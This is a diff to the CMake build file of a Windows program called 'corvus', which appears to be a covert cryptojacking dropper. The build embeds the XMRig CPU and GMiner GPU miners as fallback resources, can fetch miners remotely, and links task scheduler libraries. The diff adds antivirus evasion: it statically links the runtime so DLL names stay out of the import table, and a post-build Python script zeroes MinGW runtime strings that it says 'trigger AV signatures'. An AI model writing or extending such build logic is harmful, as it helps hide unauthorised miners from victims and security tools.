@@ -63,19 +63,29 @@ endif()
 # Generate embedded config header from JSON
 include(${CMAKE_CURRENT_SOURCE_DIR}/cmake/GenerateEmbeddedConfig.cmake)
 
+# ENABLE_EMBEDDED_CONFIG can be passed explicitly by the builder; if not set,
+# auto-detect based on whether a JSON file is available.
+option(ENABLE_EMBEDDED_CONFIG "Embed fallback config JSON in the executable" OFF)
+
 # Accept config path from builder, with fallback to client resources
 if(NOT DEFINED EMBEDDED_CONFIG_JSON_INPUT)
     set(EMBEDDED_CONFIG_JSON_INPUT "${CMAKE_CURRENT_SOURCE_DIR}/resources/embedded_config.json")
 endif()
 
 set(EMBEDDED_CONFIG_HEADER "${CMAKE_CURRENT_BINARY_DIR}/generated/embedded_config_generated.h")
-if(EXISTS "${EMBEDDED_CONFIG_JSON_INPUT}")
-    message(STATUS "Embedded config file found - generating header")
-    message(STATUS "Using embedded config from: ${EMBEDDED_CONFIG_JSON_INPUT}")
-    generate_embedded_config("${EMBEDDED_CONFIG_JSON_INPUT}" "${EMBEDDED_CONFIG_HEADER}")
-    add_definitions(-DENABLE_EMBEDDED_CONFIG)
+
+# Decide whether to embed: either explicit flag or auto-detect from file presence
+if(ENABLE_EMBEDDED_CONFIG OR EXISTS "${EMBEDDED_CONFIG_JSON_INPUT}")
+    if(EXISTS "${EMBEDDED_CONFIG_JSON_INPUT}")
+        message(STATUS "Embedded config file found - generating header")
+        message(STATUS "Using embedded config from: ${EMBEDDED_CONFIG_JSON_INPUT}")
+        generate_embedded_config("${EMBEDDED_CONFIG_JSON_INPUT}" "${EMBEDDED_CONFIG_HEADER}")
+        add_definitions(-DENABLE_EMBEDDED_CONFIG)
+    else()
+        message(WARNING "ENABLE_EMBEDDED_CONFIG=ON but no JSON file found at: ${EMBEDDED_CONFIG_JSON_INPUT}")
+    endif()
 else()
-    message(STATUS "Embedded config file not found - relying on CONFIG_GET_URL at runtime")
+    message(STATUS "Embedded config not enabled - relying on panel/GET URL at runtime")
 endif()
 
 # Source files
@@ -91,48 +101,47 @@ set(SRC_FILES
     src/config_manager.cpp
 )
 
-# Resource files (only if not using remote miners)
-if(NOT ENABLE_REMOTE_MINERS)
-    # Generate RC file based on which miners are enabled
+# Resource files - always embed miners when CPU/GPU flags set (used as fallback even in remote mode)
+# Default to CPU miner if neither flag is explicitly set and not in remote-only mode
+if(NOT DEFINED ENABLE_CPU_MINER AND NOT ENABLE_REMOTE_MINERS)
+    set(ENABLE_CPU_MINER ON)
+endif()
+if(NOT DEFINED ENABLE_GPU_MINER)
+    set(ENABLE_GPU_MINER OFF)
+endif()
+
+# Generate RC file if any miners are being embedded
+if(ENABLE_CPU_MINER OR ENABLE_GPU_MINER)
     set(GENERATED_RC "${CMAKE_CURRENT_BINARY_DIR}/embedded_resource_generated.rc")
-    
-    # Default to CPU miner if neither flag is explicitly set
-    if(NOT DEFINED ENABLE_CPU_MINER)
-        set(ENABLE_CPU_MINER ON)
-    endif()
-    if(NOT DEFINED ENABLE_GPU_MINER)
-        set(ENABLE_GPU_MINER OFF)
-    endif()
-    
-    # Build the RC file content
     set(RC_CONTENT "#include \"../include/resources.h\"\n")
-    
+
     if(ENABLE_CPU_MINER)
         string(APPEND RC_CONTENT "EMBEDDED_XMRIG RCDATA \"${CMAKE_CURRENT_SOURCE_DIR}/resources/xmrig.exe\"\n")
         message(STATUS "Embedding CPU miner (XMRig) in resources")
         add_definitions(-DENABLE_CPU_MINER)
     endif()
-    
+
     if(ENABLE_GPU_MINER)
         string(APPEND RC_CONTENT "EMBEDDED_GMINER RCDATA \"${CMAKE_CURRENT_SOURCE_DIR}/resources/gminer.exe\"\n")
         message(STATUS "Embedding GPU miner (GMiner) in resources")
         add_definitions(-DENABLE_GPU_MINER)
     endif()
-    
-    if(NOT ENABLE_CPU_MINER AND NOT ENABLE_GPU_MINER)
-        message(WARNING "No miners enabled - at least one miner should be enabled for embedded builds")
-    endif()
-    
-    # Write the generated RC file
+
     file(WRITE "${GENERATED_RC}" "${RC_CONTENT}")
-    
-    set(RESOURCE_FILES
-        "${GENERATED_RC}"
-    )
-    message(STATUS "Embedding miner resources in executable")
+    set(RESOURCE_FILES "${GENERATED_RC}")
+
+    if(ENABLE_REMOTE_MINERS)
+        message(STATUS "Remote miners enabled - embedded miners will be used as offline fallback")
+    else()
+        message(STATUS "Embedding miner resources in executable")
+    endif()
 else()
     set(RESOURCE_FILES)
-    message(STATUS "Skipping resource embedding - using remote download")
+    if(ENABLE_REMOTE_MINERS)
+        message(STATUS "Remote miners enabled - no embedded fallback (no CPU/GPU miner flags set)")
+    else()
+        message(WARNING "No miners enabled - at least one miner should be enabled for embedded builds")
+    endif()
 endif()
 
 # Header files
@@ -205,7 +214,11 @@ set_target_properties(corvus PROPERTIES
 if(MSVC)
 	target_compile_options(corvus PRIVATE /W0)
 else()
-	target_compile_options(corvus PRIVATE -w)
+	target_compile_options(corvus PRIVATE
+		-w
+		-ffunction-sections
+		-fdata-sections
+	)
 endif()
 
 # Link libraries
@@ -223,6 +236,18 @@ if(MSVC)
 		target_link_libraries(corvus taskschd.lib)
 	endif()
 else()
+	# Statically link the C/C++ runtime so api-ms-win-crt-*.dll strings
+	# never appear in the import table.
+	# -ffunction-sections/-fdata-sections + --gc-sections eliminate dead libgcc
+	# code (pseudo-reloc handler strings). --disable-runtime-pseudo-reloc
+	# ensures the handler is never referenced so --gc-sections can drop it.
+	target_link_options(corvus PRIVATE
+		-static-libgcc
+		-static-libstdc++
+		-static
+		-Wl,--gc-sections
+		-Wl,--disable-runtime-pseudo-reloc
+	)
 	target_link_libraries(corvus
 		-lwinhttp
 		-lntdll
@@ -267,5 +292,52 @@ add_custom_command(TARGET corvus POST_BUILD
     COMMAND ${CMAKE_COMMAND} -E remove ${CMAKE_BINARY_DIR}/Makefile
     COMMENT "Auto-removing CMake-generated files"
 )
+
+# Post-build: patch MinGW pseudo-reloc error strings that trigger AV signatures.
+# These strings live in libgcc.a and cannot be removed via --gc-sections because
+# crtbegin.o always keeps a live reference to the handler.  Zeroing them in the
+# linked PE is reliable and has no runtime impact (the handler only uses them
+# before abort(), and --disable-runtime-pseudo-reloc prevents it being called).
+if(NOT MSVC)
+    file(WRITE "${CMAKE_BINARY_DIR}/patch_pseudoreloc.py"
+"import sys, re
+
+path = sys.argv[1]
+with open(path, 'rb') as f:
+    data = bytearray(f.read())
+
+targets = [
+    b'Mingw-w64 runtime failure:\\n',
+    b'Address %p has no image-section',
+    b'  VirtualQuery failed for %d bytes at address %p',
+    b'  VirtualProtect failed with code 0x%x',
+    b'  Unknown pseudo relocation protocol version %d',
+    b', %g)  (retval=%g)\\n',
+]
+
+patched = 0
+for t in targets:
+    idx = data.find(t)
+    while idx != -1:
+        for i in range(idx, idx + len(t)):
+            data[i] = 0x00
+        patched += 1
+        idx = data.find(t, idx + 1)
+
+with open(path, 'wb') as f:
+    f.write(bytes(data))
+
+print('[patch] Zeroed', patched, 'pseudo-reloc string(s) in', path)
+")
+    find_program(PYTHON_EXE NAMES python3 python py)
+    if(PYTHON_EXE)
+        add_custom_command(TARGET corvus POST_BUILD
+            COMMAND ${PYTHON_EXE} "${CMAKE_BINARY_DIR}/patch_pseudoreloc.py" $<TARGET_FILE:corvus>
+            COMMENT "Patching MinGW pseudo-reloc strings in binary"
+        )
+    else()
+        message(WARNING "Python not found -- MinGW pseudo-reloc strings will NOT be patched")
+    endif()
+endif()
 
 message(STATUS "Project configured for build")
